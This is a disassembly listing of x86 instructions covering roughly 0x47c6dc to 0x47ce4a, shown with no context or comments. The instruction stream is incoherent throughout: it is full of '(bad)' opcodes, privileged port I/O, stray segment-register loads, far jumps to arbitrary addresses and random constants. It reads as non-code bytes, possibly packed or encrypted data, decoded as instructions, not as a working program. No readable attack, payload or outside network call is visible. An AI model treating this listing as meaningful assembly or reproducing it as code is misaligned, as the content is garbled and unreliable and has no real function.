  47c6dc:	jl     0x47c6fc
  47c6de:	mov    dl,0x37
  47c6e0:	enter  0x4ba6,0xff
  47c6e4:	mov    al,0x9e
  47c6e6:	cmp    eax,ecx
  47c6e8:	jg     0x47c6f3
  47c6ea:	cld    
  47c6eb:	cmp    ebx,DWORD PTR [ebp-0x8]
  47c6ee:	jle    0x47c710
  47c6f0:	loopne 0x47c726
  47c6f2:	outs   dx,BYTE PTR ds:[esi]
  47c6f3:	std    
  47c6f4:	mov    ch,0x89
  47c6f6:	sbb    BYTE PTR [eax+0x5d8c475e],dl
  47c6fc:	mov    edx,0xaa1aca82
  47c701:	adc    al,0x7d
  47c703:	or     BYTE PTR [edx+0x6ff0bcd2],dh
  47c709:	sub    al,0xf0
  47c70b:	retf   0x20ec
  47c70e:	pop    eax
  47c70f:	sbb    al,0xb
  47c711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47c712:	dec    ebp
  47c713:	jnp    0x47c725
  47c715:	lock stos BYTE PTR es:[edi],al
  47c717:	pop    ds
  47c718:	ins    DWORD PTR es:[edi],dx
  47c719:	add    ecx,DWORD PTR [ebx]
  47c71b:	lock jne 0x47c739
  47c71e:	push   0xb
  47c720:	mov    DWORD PTR [ecx+0x5a0ccd95],esi
  47c726:	test   al,0x6a
  47c728:	or     al,0x17
  47c72a:	pop    ss
  47c72b:	sub    eax,0xc3520824
  47c730:	adc    edi,DWORD PTR [edx]
  47c732:	push   ebx
  47c733:	mov    gs,eax
  47c735:	dec    eax
  47c736:	add    eax,DWORD PTR [ecx+ebx*1+0xd7e43d8]
  47c73d:	imul   ebx,eax,0xb3eab1b0
  47c743:	or     eax,0xb5cc4938
  47c748:	xchg   esi,eax
  47c749:	sbb    edx,edx
  47c74b:	xchg   esi,eax
  47c74c:	dec    eax
  47c74d:	pop    ds
  47c74e:	imul   bx,si
  47c752:	pop    esi
  47c753:	push   edx
  47c754:	xor    DWORD PTR [eax-0x189f78c],0x318527e4
  47c75e:	inc    edx
  47c75f:	mov    DWORD PTR [ecx+ebp*1],ecx
  47c762:	aad    0x2d
  47c764:	rol    DWORD PTR [edx+0x52],0x79
  47c768:	mov    eax,0x8f3ed8ea
  47c76d:	xlat   BYTE PTR ds:[ebx]
  47c76e:	dec    ecx
  47c76f:	jl     0x47c7da
  47c771:	adc    al,BYTE PTR [edx]
  47c773:	out    dx,al
  47c774:	fnstenv [esi+edx*8+0x79]
  47c778:	test   BYTE PTR [ebp+0x3c],cl
  47c77b:	jge    0x47c771
  47c77d:	mov    WORD PTR [esi+edi*4-0x35],cs
  47c781:	mov    dh,0xc1
  47c783:	push   eax
  47c784:	lods   al,BYTE PTR ds:[esi]
  47c785:	mov    edx,0x41c2443e
  47c78a:	(bad)  
  47c78b:	loope  0x47c77a
  47c78d:	in     eax,dx
  47c78e:	push   es
  47c78f:	push   0xffffffe4
  47c791:	jg     0x47c7be
  47c793:	or     al,ah
  47c795:	jl     0x47c7bd
  47c797:	push   ebp
  47c798:	cmp    ecx,DWORD PTR [ebp-0x19a317ec]
  47c79e:	cdq    
  47c79f:	mov    eax,0x804d148c
  47c7a4:	dec    ebp
  47c7a5:	xor    al,0xb
  47c7a7:	add    bh,BYTE PTR [edi]
  47c7a9:	sbb    DWORD PTR [esi+eax*1-0x77],edx
  47c7ad:	jne    0x47c7e5
  47c7af:	or     BYTE PTR [edi+0x67],cl
  47c7b2:	test   BYTE PTR [esi+0x4f],0x75
  47c7b6:	mov    ecx,0xbc96553d
  47c7bb:	jnp    0x47c7ed
  47c7bd:	adc    BYTE PTR [eax],dh
  47c7bf:	mov    eax,0xb015317e
  47c7c4:	mov    eax,0x3095c5c3
  47c7c9:	sbb    dl,bh
  47c7cb:	mov    ah,0x24
  47c7cd:	pop    ebx
  47c7ce:	ffree  st(5)
  47c7d0:	aam    0x1f
  47c7d2:	stos   BYTE PTR es:[edi],al
  47c7d3:	in     al,dx
  47c7d4:	ss push eax
  47c7d6:	mov    ds:0xf21fd208,al
  47c7db:	in     al,dx
  47c7dc:	add    eax,DWORD PTR [ebp+0x10]
  47c7df:	sub    eax,DWORD PTR [edx]
  47c7e1:	add    esi,esi
  47c7e3:	aam    0x5d
  47c7e5:	and    al,0xad
  47c7e7:	adc    al,0x33
  47c7e9:	dec    eax
  47c7ea:	es aam 0x21
  47c7ed:	mov    eax,ds:0xccc443a6
  47c7f2:	or     al,cl
  47c7f4:	sbb    BYTE PTR [edx],bh
  47c7f6:	mov    al,0x33
  47c7f8:	add    BYTE PTR [edx+0x4b69d71a],cl
  47c7fe:	imul   edx,DWORD PTR [eax+esi*4-0x74],0xffffffc7
  47c803:	enter  0xa41c,0xb5
  47c807:	mov    eax,ds:0xc4cc7222
  47c80c:	cwde   
  47c80d:	mov    ds,WORD PTR [ebp-0x6c]
  47c810:	fnstenv [esi-0x58]
  47c813:	mov    al,ds:0x759f9c76
  47c818:	mov    al,0x1a
  47c81a:	jne    0x47c7c8
  47c81c:	or     BYTE PTR [edi+eax*1-0x1a],0xb4
  47c821:	pusha  
  47c822:	push   ds
  47c823:	fwait
  47c824:	sub    edx,DWORD PTR [ecx-0x2f1ab690]
  47c82a:	xchg   eax,edx
  47c82c:	and    al,0x14
  47c82e:	jbe    0x47c803
  47c830:	or     al,BYTE PTR ds:[ebx]
  47c833:	ret    
  47c834:	push   cs
  47c835:	(bad)  
  47c836:	rcl    BYTE PTR [eax+0x53],0xcb
  47c83a:	or     eax,0xf6f599bb
  47c83f:	les    ebp,FWORD PTR [eax+0x1110c9]
  47c845:	(bad)  
  47c846:	mov    ebx,0x3f8653
  47c84b:	arpl   WORD PTR [edx-0x4bf949bb],cx
  47c851:	je     0x47c89b
  47c853:	outs   dx,DWORD PTR ds:[esi]
  47c854:	xor    eax,0x130dd65a
  47c859:	lea    ebp,[ebx-0x1e]
  47c85c:	jmp    0x854368b9
  47c861:	cmp    BYTE PTR [ecx],cl
  47c863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47c864:	rcl    eax,0x8b
  47c867:	mov    ss,WORD PTR [eax]
  47c869:	mul    BYTE PTR [ebx-0x7f]
  47c86c:	cwde   
  47c86d:	ret    0x7dfe
  47c870:	aas    
  47c871:	rcr    DWORD PTR [esi],cl
  47c873:	ds pushf 
  47c875:	mov    cl,0x71
  47c877:	or     BYTE PTR [ebx],dl
  47c879:	inc    ebp
  47c87a:	jmp    0xd185:0x63968ec1
  47c881:	jbe    0x47c873
  47c883:	test   DWORD PTR [ecx+0x32],esi
  47c886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47c887:	lods   eax,DWORD PTR ds:[esi]
  47c888:	pop    ds
  47c889:	or     al,0xac
  47c88b:	xor    bh,ah
  47c88d:	scas   eax,DWORD PTR es:[edi]
  47c88e:	daa    
  47c88f:	cli    
  47c890:	mov    ds:0x54182454,al
  47c895:	push   0x54
  47c897:	outs   dx,DWORD PTR ds:[esi]
  47c898:	jo     0x47c86b
  47c89a:	or     eax,0x1f0790ae
  47c89f:	pop    esp
  47c8a0:	jmp    0x47c8e1
  47c8a2:	add    al,BYTE PTR [eax+0x7c]
  47c8a5:	sbb    BYTE PTR [ebp+0x523bc2c5],al
  47c8ab:	sbb    BYTE PTR [eax],ch
  47c8ad:	jb     0x47c8c0
  47c8af:	sub    cl,BYTE PTR [ebp+0x163c2c74]
  47c8b5:	cmp    ah,BYTE PTR [esi+0xa]
  47c8b8:	sub    ebx,ebp
  47c8ba:	or     BYTE PTR [ebx+0x21],dl
  47c8bd:	cwde   
  47c8be:	sbb    al,0xca
  47c8c0:	sub    al,dl
  47c8c2:	cmp    eax,0x3a17b94
  47c8c7:	adc    eax,0x760c04fd
  47c8cc:	adc    eax,0xc67f91d0
  47c8d1:	je     0x47c947
  47c8d3:	cmovs  ecx,DWORD PTR [edx]
  47c8d6:	or     eax,DWORD PTR [eax]
  47c8d8:	(bad)  
  47c8d9:	mov    dh,0xe
  47c8db:	jle    0x47c90a
  47c8dd:	lock ds jb 0x47c8f6
  47c8e1:	jmp    0x47c901
  47c8e3:	sti    
  47c8e4:	cs mov bh,0xa2
  47c8e7:	mov    WORD PTR [esi],cs
  47c8e9:	int3   
  47c8ea:	jmp    0x47c910
  47c8ec:	(bad)  
  47c8ee:	mov    DWORD PTR [ebx+0x20],esi
  47c8f1:	jmp    0x47c90c
  47c8f3:	adc    eax,0xa5ac35bd
  47c8f8:	or     cl,dh
  47c8fa:	adc    ah,BYTE PTR [esi-0x9]
  47c8fd:	ins    BYTE PTR es:[edi],dx
  47c8fe:	pop    ds
  47c8ff:	scas   eax,DWORD PTR es:[edi]
  47c900:	mov    ecx,0xe820e61
  47c905:	xor    BYTE PTR [esp],cl
  47c908:	inc    ebx
  47c909:	inc    esi
  47c90a:	imul   esp,DWORD PTR [ecx],0x736220a8
  47c910:	add    ebp,DWORD PTR [esi+0x5e]
  47c913:	fistp  DWORD PTR [edx]
  47c915:	adc    edx,DWORD PTR [edx+edx*4]
  47c918:	push   ebx
  47c919:	push   cs
  47c91a:	retf   
  47c91b:	scas   al,BYTE PTR es:[edi]
  47c91c:	xor    eax,0x88128c0
  47c921:	inc    ebx
  47c922:	or     BYTE PTR [eax-0x47ebfd68],ah
  47c928:	xchg   BYTE PTR [edx+edx*8],dl
  47c92b:	cdq    
  47c92c:	js     0x47c8ce
  47c92e:	mov    dl,0x54
  47c930:	mov    ah,0xc7
  47c932:	fadd   DWORD PTR [eax-0xd]
  47c935:	pop    ebx
  47c936:	ror    BYTE PTR [eax+0x4d],0x8
  47c93a:	fmul   QWORD PTR [ecx]
  47c93c:	ds sbb eax,0xbbe64600
  47c942:	adc    DWORD PTR [ebx+0x21],ebp
  47c945:	pop    eax
  47c946:	test   BYTE PTR [esi+0x70030ef6],cl
  47c94c:	add    ecx,DWORD PTR [eax+ebp*1]
  47c94f:	mov    DWORD PTR [ecx],esi
  47c951:	jne    0x47c9b5
  47c953:	sub    ah,BYTE PTR [eax]
  47c955:	adc    ebx,ecx
  47c957:	xor    al,0xf0
  47c959:	add    BYTE PTR [edi],ah
  47c95b:	(bad)  
  47c95d:	add    ebx,DWORD PTR [ebx+ecx*2+0xa]
  47c961:	imul   eax,DWORD PTR [esi-0x3e],0x17
  47c965:	sbb    al,0x6
  47c967:	lods   eax,DWORD PTR ds:[esi]
  47c968:	ja     0x47c984
  47c96a:	add    dh,bl
  47c96c:	nop
  47c96d:	cmc    
  47c96e:	add    ebp,ebx
  47c970:	mov    esp,0x120086c3
  47c975:	mov    bh,0x5f
  47c977:	les    esp,FWORD PTR [ebx+eax*2]
  47c97a:	loopne 0x47c999
  47c97c:	add    bh,bl
  47c97e:	loope  0x47c9c1
  47c980:	jle    0x47c9cc
  47c982:	inc    ebx
  47c983:	push   ecx
  47c984:	hlt    
  47c985:	jle    0x47c950
  47c987:	out    dx,al
  47c988:	mov    ebx,0xffa4701b
  47c98d:	xor    dl,BYTE PTR [edi-0xb]
  47c990:	call   0x1b08e0e9
  47c995:	es or  al,0xb8
  47c998:	push   0xc4d1b612
  47c99d:	mov    al,0xab
  47c99f:	ret    0x2d56
  47c9a2:	inc    eax
  47c9a3:	enter  0x9873,0xf1
  47c9a7:	xchg   BYTE PTR [ebp-0x1],al
  47c9aa:	popa   
  47c9ab:	shr    dh,1
  47c9ad:	clc    
  47c9ae:	imul   esp,DWORD PTR [ecx],0x27
  47c9b1:	int    0xf8
  47c9b3:	hlt    
  47c9b4:	hlt    
  47c9b5:	imul   esi,DWORD PTR ds:0xaf954f85,0xffffffce
  47c9bc:	cli    
  47c9bd:	pusha  
  47c9be:	or     al,0xb2
  47c9c0:	jg     0x47c9a0
  47c9c2:	sub    bl,bl
  47c9c4:	push   edi
  47c9c5:	mov    al,ds:0x8fc3814b
  47c9ca:	and    ebp,esp
  47c9cc:	(bad)  
  47c9cd:	lods   al,BYTE PTR ds:[esi]
  47c9ce:	icebp  
  47c9cf:	rcl    al,cl
  47c9d1:	add    eax,0xff4d88a6
  47c9d6:	mov    ebp,0xb4f24d6
  47c9db:	jb     0x47c9c1
  47c9dd:	push   es
  47c9de:	sbb    al,0xac
  47c9e0:	adc    BYTE PTR [esi],al
  47c9e2:	call   0xce04a05d
  47c9e7:	pop    ecx
  47c9e8:	call   0xf11dba6a
  47c9ed:	and    BYTE PTR [eax-0x38],dh
  47c9f0:	in     al,dx
  47c9f1:	lock add cl,BYTE PTR [edi]
  47c9f4:	dec    ebp
  47c9f5:	sar    DWORD PTR [esi+0x38],cl
  47c9f8:	mov    ah,0xc8
  47c9fa:	pop    ebp
  47c9fb:	push   0x10
  47c9fd:	push   ds
  47c9fe:	in     al,dx
  47c9ff:	hlt    
  47ca00:	int3   
  47ca01:	push   eax
  47ca02:	jmp    0xe88cf641
  47ca07:	or     esp,esp
  47ca09:	loopne 0x47ca5f
  47ca0b:	or     eax,0x83810ee9
  47ca10:	lds    ebx,FWORD PTR [eax-0x8]
  47ca13:	rcr    ah,cl
  47ca15:	ficomp WORD PTR [eax-0xb1beaf0]
  47ca1b:	jp     0x47ca00
  47ca1d:	sub    BYTE PTR [eax-0x20],dh
  47ca20:	(bad)  
  47ca21:	fdivr  st(6),st
  47ca23:	or     eax,0x429d099e
  47ca28:	dec    ebp
  47ca29:	pop    eax
  47ca2a:	loope  0x47c9ea
  47ca2c:	mov    al,0x54
  47ca2e:	call   0xcce0:0x10dc24a6
  47ca35:	ins    BYTE PTR es:[edi],dx
  47ca36:	popa   
  47ca37:	mov    al,ds:0x151e2505
  47ca3c:	push   ss
  47ca3d:	add    eax,DWORD PTR [edi]
  47ca3f:	adc    DWORD PTR [edi+0x3],0x5c10f003
  47ca46:	arpl   WORD PTR [ebx],bp
  47ca48:	adc    DWORD PTR [eax],eax
  47ca4a:	and    eax,0xccf337eb
  47ca4f:	and    al,BYTE PTR [eax]
  47ca51:	inc    ebp
  47ca52:	fmul   DWORD PTR [edx]
  47ca54:	fidiv  DWORD PTR [esi+edx*8]
  47ca57:	mov    ecx,0xa05fb406
  47ca5c:	and    al,0xac
  47ca5e:	mov    dl,BYTE PTR [eax+0x4]
  47ca61:	mov    BYTE PTR [ebp-0x54],dl
  47ca64:	or     cl,BYTE PTR [eax]
  47ca66:	push   ecx
  47ca67:	add    eax,0x66add806
  47ca6c:	mov    ?,WORD PTR [eax+0x50]
  47ca6f:	in     ax,dx
  47ca71:	mov    dh,0x61
  47ca73:	ja     0x47c9fe
  47ca75:	push   ebp
  47ca76:	scas   al,BYTE PTR es:[edi]
  47ca77:	test   al,0xa3
  47ca79:	mov    ah,0x76
  47ca7b:	mov    eax,0xac7a6a16
  47ca80:	mov    ebx,0xb9c81aba
  47ca85:	adc    BYTE PTR [esi+0x1],bh
  47ca88:	test   BYTE PTR [ebp+0x10],dl
  47ca8b:	sbb    al,0xd2
  47ca8d:	mov    ah,0x6d
  47ca8f:	dec    ebp
  47ca90:	hlt    
  47ca91:	sub    ebx,DWORD PTR [eax]
  47ca93:	fsub   st(4),st
  47ca95:	in     al,0x51
  47ca97:	lods   eax,DWORD PTR ds:[esi]
  47ca98:	test   al,0xd3
  47ca9a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47ca9c:	mov    bl,0x5e
  47ca9e:	pop    ebp
  47ca9f:	pop    ebp
  47caa0:	in     eax,0xcc
  47caa2:	lock hlt 
  47caa4:	jle    0x47ca59
  47caa6:	leave  
  47caa7:	fcom   QWORD PTR [edx+0x75]
  47caaa:	rcr    ah,cl
  47caac:	adc    eax,0xf4f0e8f8
  47cab1:	in     al,0x2
  47cab3:	pushf  
  47cab4:	arpl   WORD PTR [ebx],ax
  47cab6:	int3   
  47cab7:	xor    ebx,0x2ec7c46d
  47cabd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47cabe:	xor    edi,DWORD PTR ds:0xc1a2468d
  47cac4:	outs   dx,DWORD PTR ds:[esi]
  47cac5:	pop    edi
  47cac6:	xor    DWORD PTR [ebx+ebp*8+0x7],0xffffffc6
  47cacb:	inc    eax
  47cacc:	and    BYTE PTR [ecx],al
  47cace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47cacf:	adc    dl,BYTE PTR [eax+ecx*1]
  47cad2:	js     0x47ca78
  47cad4:	push   es
  47cad5:	jl     0x47cb3e
  47cad7:	cmp    al,0xeb
  47cad9:	pusha  
  47cada:	sbb    eax,0x1737895f
  47cadf:	mov    ebx,DWORD PTR [eax+0x20]
  47cae2:	frstor [ecx]
  47cae4:	das    
  47cae5:	dec    eax
  47cae6:	loop   0x47cb64
  47cae8:	mov    ebx,0xc1d33318
  47caed:	cmp    cl,BYTE PTR [edx+0x8]
  47caf0:	outs   dx,DWORD PTR ds:[esi]
  47caf1:	sbb    BYTE PTR [esi],dh
  47caf3:	sbb    DWORD PTR [eax-0x31ed9466],0xa2402f32
  47cafd:	mov    ebx,0x1f348604
  47cb02:	nop
  47cb03:	outs   dx,BYTE PTR ds:[esi]
  47cb04:	lea    esp,[eax+0x523467d0]
  47cb0a:	iret   
  47cb0b:	pop    es
  47cb0c:	adc    ch,BYTE PTR [edi+0x13]
  47cb0f:	inc    esp
  47cb10:	push   eax
  47cb11:	push   0xffffffe1
  47cb13:	dec    eax
  47cb14:	call   0x90acec50
  47cb19:	icebp  
  47cb1a:	or     bh,bl
  47cb1c:	sub    al,0xa4
  47cb1e:	jmp    0xc21e:0x1787614c
  47cb25:	js     0x47cad0
  47cb27:	adc    al,0xa1
  47cb29:	je     0x47cb29
  47cb2b:	add    BYTE PTR [eax-0x5fee43b4],bl
  47cb31:	fmul   QWORD PTR [ecx]
  47cb33:	fmul   DWORD PTR [eax+0xb953809]
  47cb39:	leave  
  47cb3a:	mov    cl,0xc3
  47cb3c:	or     DWORD PTR [ebx+0x742b2474],ebp
  47cb42:	pusha  
  47cb43:	adc    edx,DWORD PTR [esi+esi*1-0x1cdb968b]
  47cb4a:	sub    dl,BYTE PTR [edx-0x7e]
  47cb4d:	jns    0x47cb53
  47cb4f:	jge    0x47cb1d
  47cb51:	mov    ecx,0xafa9c459
  47cb56:	daa    
  47cb57:	repz lds ecx,FWORD PTR [ebx+0x3b132a4b]
  47cb5e:	inc    esp
  47cb5f:	dec    ebp
  47cb60:	hlt    
  47cb61:	or     dh,ch
  47cb63:	add    eax,0x8bf4e589
  47cb68:	(bad)  
  47cb69:	pop    ecx
  47cb6a:	adc    dl,BYTE PTR [edx-0x5b]
  47cb6d:	xchg   BYTE PTR [ebx],ah
  47cb6f:	in     eax,0x5
  47cb71:	dec    edi
  47cb72:	repnz mov esp,0x50230cdd
  47cb78:	rcr    BYTE PTR [eax+0x75],1
  47cb7b:	push   ds
  47cb7c:	cmp    DWORD PTR [ebx-0x5a7dde38],ecx
  47cb82:	mov    eax,ds:0x58012ec7
  47cb87:	shl    DWORD PTR [edi+0x29be417b],0xe4
  47cb8e:	adc    DWORD PTR [ebp+0x11],edx
  47cb91:	repz cs cmp eax,edi
  47cb95:	rcr    BYTE PTR [edx],0xd7
  47cb98:	inc    eax
  47cb99:	mov    ebx,0xde228507
  47cb9e:	out    0x8a,eax
  47cba0:	inc    eax
  47cba1:	and    ebx,eax
  47cba3:	out    dx,eax
  47cba4:	mov    BYTE PTR [ecx],ah
  47cba6:	pop    es
  47cba7:	sbb    DWORD PTR [edx-0xc70ab0d],edx
  47cbad:	dec    edx
  47cbae:	jecxz  0x47cbb8
  47cbb0:	sbb    BYTE PTR [edx+ebx*1-0x4c],ah
  47cbb4:	push   cs
  47cbb5:	jo     0x47cb37
  47cbb7:	test   BYTE PTR [edx+0x653145d],0x10
  47cbbe:	mov    WORD PTR [edx*4+0x16f01352],cs
  47cbc5:	imul   edi,DWORD PTR [edx+eiz*1-0x22],0xffffffce
  47cbca:	cwde   
  47cbcb:	test   eax,0xc35ea7ee
  47cbd0:	mov    es,WORD PTR [edx+0x13cf4543]
  47cbd6:	hlt    
  47cbd7:	adc    eax,0xc812b258
  47cbdc:	inc    ebx
  47cbdd:	sbb    dh,ah
  47cbdf:	imul   esp,DWORD PTR [ebp+eax*2+0x7f],0xffffffdf
  47cbe4:	cmp    dl,BYTE PTR [eax+0x21]
  47cbe7:	ror    BYTE PTR [eax-0x32892df8],1
  47cbed:	xor    DWORD PTR [edi+0x69],esp
  47cbf0:	out    dx,eax
  47cbf1:	pop    eax
  47cbf2:	mov    WORD PTR [edx+0x1],?
  47cbf5:	test   ah,bl
  47cbf7:	lds    eax,FWORD PTR [esi]
  47cbf9:	mov    eax,0xeda41f
  47cbfe:	jns    0x47cb90
  47cc00:	in     al,dx
  47cc01:	mov    ?,eax
  47cc03:	mov    ecx,0x8942f640
  47cc08:	mov    al,ds:0x6f70cf6
  47cc0d:	or     eax,0x13ac4d6d
  47cc12:	jl     0x47cb95
  47cc14:	mov    DWORD PTR es:[edi],0x2888c29
  47cc1b:	daa    
  47cc1c:	aam    0xcd
  47cc1e:	mov    edx,0x83e4d7ab
  47cc23:	sar    BYTE PTR [eax-0x5f],cl
  47cc26:	push   eax
  47cc27:	sbb    DWORD PTR [bp+si-0xb],edi
  47cc2b:	inc    ecx
  47cc2c:	mov    eax,0xd9468f48
  47cc31:	in     al,0x0
  47cc33:	jl     0x47cc8e
  47cc35:	cwde   
  47cc36:	dec    edx
  47cc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47cc38:	jno    0x47cc86
  47cc3a:	xor    ebp,DWORD PTR ds:0xb3be8ee9
  47cc40:	add    edx,ecx
  47cc42:	and    ah,cl
  47cc44:	xor    ebp,DWORD PTR [ebp+0x52]
  47cc47:	repnz leave 
  47cc49:	jecxz  0x47cc23
  47cc4b:	xor    esp,esi
  47cc4d:	push   0x1f5598f
  47cc52:	retf   0xd87c
  47cc55:	mov    DWORD PTR [edx],0x5c4dff0e
  47cc5b:	push   DWORD PTR [ebp-0x56]
  47cc5e:	dec    ebx
  47cc5f:	or     ch,BYTE PTR [ecx+0x1981e705]
  47cc65:	adc    DWORD PTR [ebx],eax
  47cc67:	adc    DWORD PTR [ebx+0x14863f44],0x68ed21dc
  47cc71:	imul   edx,esi,0x583e4c25
  47cc77:	sub    al,0xf8
  47cc79:	cmc    
  47cc7a:	imul   esp,DWORD PTR [eax-0x6e],0x5826bdab
  47cc81:	mov    al,0x2
  47cc83:	test   BYTE PTR [edi+0x28528b2a],bl
  47cc89:	mov    al,0x69
  47cc8b:	aaa    
  47cc8c:	sbb    BYTE PTR [ecx-0x7a],al
  47cc8f:	mov    eax,0xdafa4a3a
  47cc94:	mov    ds:0xff0e4030,al
  47cc99:	dec    DWORD PTR [eax-0x2e70c53d]
  47cc9f:	add    esi,eax
  47cca1:	or     al,0x89
  47cca3:	ja     0x47ccfd
  47cca5:	pop    edx
  47cca6:	dec    eax
  47cca7:	xor    DWORD PTR [ecx],ecx
  47cca9:	jecxz  0x47cc8c
  47ccab:	mov    al,0x6c
  47ccad:	xor    DWORD PTR [edi],edx
  47ccaf:	out    dx,al
  47ccb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47ccb1:	or     ecx,DWORD PTR [esp+eax*4-0x1c]
  47ccb5:	add    esi,eax
  47ccb7:	shl    BYTE PTR [edi],1
  47ccb9:	jge    0x47cd0c
  47ccbb:	cmp    BYTE PTR [eax+0x2e],al
  47ccbe:	mov    cl,0x1
  47ccc0:	stc    
  47ccc1:	cld    
  47ccc2:	add    DWORD PTR [edi-0x37],eax
  47ccc5:	adc    BYTE PTR [eax],al
  47ccc7:	test   DWORD PTR [esi+ebx*8],0xc5c84b1
  47ccce:	push   eax
  47cccf:	adc    eax,0x6dd3f606
  47ccd4:	ins    DWORD PTR es:[edi],dx
  47ccd5:	sub    eax,0xff6a0f60
  47ccda:	xor    eax,ebp
  47ccdc:	adc    BYTE PTR [ebx+0x7cad22f2],0xb0
  47cce3:	clc    
  47cce4:	ror    BYTE PTR [edi+eiz*8+0x4],cl
  47cce8:	aas    
  47cce9:	mov    al,ds:0x47134a1c
  47ccee:	in     eax,0x2c
  47ccf0:	fild   WORD PTR [edi]
  47ccf2:	test   ecx,0xca9c818a
  47ccf8:	pop    es
  47ccf9:	inc    ecx
  47ccfa:	outs   dx,DWORD PTR ds:[esi]
  47ccfb:	arpl   cx,cx
  47ccfd:	jae    0x47cd57
  47ccff:	ror    BYTE PTR [edx+ebx*2-0x1437f20a],1
  47cd06:	neg    DWORD PTR [eax+0x30]
  47cd09:	cli    
  47cd0a:	sub    al,0x15
  47cd0c:	add    al,0x28
  47cd0e:	test   BYTE PTR [edx-0x14],bh
  47cd11:	shl    DWORD PTR [eax],cl
  47cd13:	or     ch,ah
  47cd15:	test   BYTE PTR [edi],dh
  47cd17:	sti    
  47cd18:	sub    al,0xaf
  47cd1a:	jmp    0xe070:0x492d31b7
  47cd21:	orps   xmm4,XMMWORD PTR [esi]
  47cd24:	lock xchg ebx,eax
  47cd26:	adc    cl,bh
  47cd28:	and    BYTE PTR [ebx+ebp*8+0x8],bl
  47cd2c:	adc    edi,DWORD PTR [edi+edx*8]
  47cd2f:	out    0xe1,al
  47cd31:	pop    esp
  47cd32:	dec    ebp
  47cd33:	adc    BYTE PTR [edi],dl
  47cd35:	int3   
  47cd36:	push   ecx
  47cd37:	(bad)  
  47cd38:	mov    cl,0xef
  47cd3a:	xor    ch,al
  47cd3c:	pusha  
  47cd3d:	pop    ss
  47cd3e:	mov    eax,0x4306605d
  47cd43:	pop    esi
  47cd44:	rol    DWORD PTR [edx-0x6fcb2a1f],0x3a
  47cd4b:	xchg   esp,eax
  47cd4c:	mov    al,0x92
  47cd4e:	repnz aas 
  47cd50:	adc    eax,DWORD PTR [edi+0xff80880]
  47cd56:	icebp  
  47cd57:	or     al,al
  47cd59:	es stos BYTE PTR es:[edi],al
  47cd5b:	dec    ebx
  47cd5c:	add    al,0x48
  47cd5e:	jne    0x47cd6d
  47cd60:	inc    esp
  47cd61:	jl     0x47cd90
  47cd63:	add    BYTE PTR [ecx+0xd],0xfc
  47cd67:	adc    dh,BYTE PTR [ecx]
  47cd69:	mov    eax,0x851387bf
  47cd6e:	add    eax,0x16bd1dc0
  47cd73:	lahf   
  47cd74:	pop    es
  47cd75:	mov    ah,0x7b
  47cd77:	sub    DWORD PTR [eax+0x12],edx
  47cd7a:	imul   eax,DWORD PTR [esi+0x64],0x52182cff
  47cd81:	jg     0x47cdd7
  47cd83:	push   eax
  47cd84:	lea    eax,[esi+0x6c]
  47cd87:	xchg   DWORD PTR [esi+0x3fb8ac60],ebx
  47cd8d:	das    
  47cd8e:	add    edx,DWORD PTR [ecx+0x3ba7efb3]
  47cd94:	inc    ebx
  47cd95:	adc    al,0x74
  47cd97:	push   cs
  47cd98:	mov    cl,0x43
  47cd9a:	or     BYTE PTR [eax+0x43],ah
  47cd9d:	dec    esi
  47cd9e:	push   ebx
  47cd9f:	push   cs
  47cda0:	fild   DWORD PTR [ebx+0xc]
  47cda3:	adc    al,0x61
  47cda5:	mov    dh,0xf0
  47cda7:	xor    eax,0x953caf0f
  47cdac:	(bad)  
  47cdad:	jns    0x47cdc6
  47cdaf:	lea    edx,[eax]
  47cdb1:	push   edi
  47cdb2:	lock sti 
  47cdb4:	test   DWORD PTR [edi-0x3f],eax
  47cdb7:	adc    ebx,DWORD PTR [ebx+0x10]
  47cdba:	sahf   
  47cdbb:	mov    edx,0x521bf65
  47cdc0:	jns    0x47cde8
  47cdc2:	or     BYTE PTR [edi],cl
  47cdc4:	xchg   DWORD PTR [ebx-0x160febee],edx
  47cdca:	shl    DWORD PTR [ebx-0x28600088],0x10
  47cdd1:	stc    
  47cdd2:	jp     0x47ce00
  47cdd4:	(bad)  
  47cdd5:	adc    edx,DWORD PTR [esi]
  47cdd7:	xchg   DWORD PTR [ecx+0x148a047f],esi
  47cddd:	bound  edx,QWORD PTR [ecx]
  47cddf:	adc    al,0xf0
  47cde1:	dec    esi
  47cde2:	je     0x47cd67
  47cde4:	jl     0x47cdd0
  47cde6:	jae    0x47cde1
  47cde8:	test   DWORD PTR [ebx+0x5361a850],edx
  47cdee:	dec    esp
  47cdef:	ins    BYTE PTR es:[edi],dx
  47cdf0:	inc    edi
  47cdf1:	fwait
  47cdf2:	jp     0x47ce3e
  47cdf4:	push   esi
  47cdf5:	nop
  47cdf6:	inc    ecx
  47cdf7:	mov    bh,BYTE PTR [eax+esi*8]
  47cdfa:	loopne 0x47ce27
  47cdfc:	jle    0x47cdde
  47cdfe:	push   0xf68fd729
  47ce03:	aam    0x3
  47ce05:	je     0x47cddb
  47ce07:	mov    BYTE PTR [ebp-0x72],bl
  47ce0a:	inc    edx
  47ce0b:	fiadd  DWORD PTR [edx]
  47ce0d:	jne    0x47ce4b
  47ce0f:	mov    esi,0xafa19826
  47ce14:	mov    ds:0x177510d6,al
  47ce19:	mov    DWORD PTR [eax+0x2],0x1372b0b7
  47ce20:	push   esp
  47ce21:	or     al,0x44
  47ce23:	loopne 0x47ce2c
  47ce25:	dec    eax
  47ce26:	pop    ds
  47ce27:	pusha  
  47ce28:	xchg   edi,eax
  47ce29:	xchg   ebp,eax
  47ce2a:	xchg   ebp,eax
  47ce2b:	fistp  WORD PTR [ebx]
  47ce2d:	cmp    BYTE PTR [eax],ah
  47ce2f:	jne    0x47ce46
  47ce31:	add    bh,bh
  47ce33:	add    bh,bh
  47ce35:	inc    DWORD PTR [esp+eax*4]
  47ce38:	add    DWORD PTR [eax],edi
  47ce3a:	pop    ss
  47ce3b:	mov    esp,0xe0697585
  47ce40:	or     eax,0x34258ce9
  47ce45:	xor    eax,esp
  47ce47:	les    ebx,FWORD PTR [eax]
  47ce49:	stos   DWORD PTR es:[edi],eax
  47ce4a:	cmp    al,0x9f
